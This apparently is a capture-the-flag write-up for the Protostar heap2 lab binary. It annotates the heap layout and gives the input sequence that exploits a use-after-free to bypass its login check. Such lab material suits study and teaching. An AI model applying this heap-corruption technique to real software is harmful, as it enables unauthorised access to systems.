This is a demonstration of a use-after-free vulnerability

//Heap Layout: (after first malloc)
//Start: 0x804c000
//End  : 0x804d000
//Size :    0x1000
//
//
//0x804c000:
//0x804c004: 0x11 ==> Chunk size == 0x10 == 16 Bytes
//[0x804c008, 0x804c00c]: *auth
//  [0x804c008, 0x804c00c): [auth->name[0], auth->name[4])
//[0x804c00c, 0x804c010): padding
//
////Since the programmer, messed up his malloc, his data are not in allocated chunks and thus we can overwrite them with the strdup
//0x804c008: *auth
//  [0x804c008, 0x804c028): auth->name
//   0x804c028: auth->auth
//
//chunk is freed
//chunk is re-used since it fits for the first `strdup` call
//0x804c000:
//0x804c004:
//[0x804c008, 0x804c010): *service
//  BBBBBBB\n
//
//new chunk is allocated for the 2nd call to `strdup`
//0x804c010:
//0x804c014: 0x00000019 ==> Chunk Size == 0x18 == 24 Bytes
//[0x804c018, 0x804c02a): *service
//  CCCCCCCCCCCCCCCC\n
//

In order to run the exploit, run the following command:

/opt/protostar/bin/heap2
> auth AAAA
> reset
> serviceBBBBBBB
> serviceCCCCCCCCCCCCCCCC
> login
